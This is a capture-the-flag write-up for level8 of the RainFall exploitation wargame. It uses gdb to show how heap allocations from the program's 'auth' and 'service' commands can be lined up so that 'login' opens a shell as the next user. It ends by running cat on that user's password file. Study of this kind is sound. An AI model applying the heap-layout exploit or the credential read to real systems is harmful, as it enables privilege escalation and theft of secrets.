The complexity here is to read the operations of the `main`. Let's try the program :

```
level8@RainFall:~$ ./level8
(nil), (nil) 
```

It keeps looping, and keep stdin open listening to its values every time.

```
iVar2 = fgets(auStack144, 0x80, _stdin);
```

Thanks to `fgets`, `stdin` value is saved in `auStack144`.

```
printf("%p, %p \n", _auth, _service); 
```

We understand that there are 2 global variables named `auth` and `service` that can be usefull to us, let's check;

```
(gdb) info variables
All defined variables:

Non-debugging symbols:

...

0x08049aac  auth
0x08049ab0  service

...
```

When we look at the `main` function, we can see that `auStack144` value si compared with the 4 string `"auth " "reset" "service" "login"` that are some kinds of commands; with "login", we have to find how to unlock `system("/bin/sh");`

```
0x080486e2 <+382>:	mov    eax,ds:0x8049aac
0x080486e7 <+387>:	mov    eax,DWORD PTR [eax+0x20]
0x080486ea <+390>:	test   eax,eax
```
to unlock the shell, there is a check if something comes 32 bytes (0x20) after `auth`.


1. type `auth ` to create a pointer on a memory zone in the heap
```
0x080485eb <+135>:	call   0x8048470 <malloc@plt>
0x080485f0 <+140>:	mov    ds:0x8049aac,eax
0x080485f5 <+145>:	mov    eax,ds:0x8049aac
0x080485fa <+150>:	mov    DWORD PTR [eax],0x0
```

in gdb, I set a breakpoint at the `printf` call :
```
Starting program: /home/user/level8/level8 

Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x auth
0x0:	Cannot access memory at address 0x0
(gdb) c
Continuing.
(nil), (nil) 
auth 

Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x auth
0x804a008:	0x0000000a
```

1. the `service` command use `strdup` that also uses `malloc`, and we can observe  that its value increases :
```
level8@RainFall:~$ ./level8 
(nil), (nil) 
service
(nil), 0x804a008 
service
(nil), 0x804a018 
```

So we know we must initialize by typing `auth ` one time and then if we calculate :
```
>>> int('0x20', 16) + int('0x804a008', 16)
134520872
>>> hex(134520872)
'0x804a028'
```
so we have to type `service` two times then `login`.

```
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$ whoami
level9
$ cat /home/user/level9/.pass
```


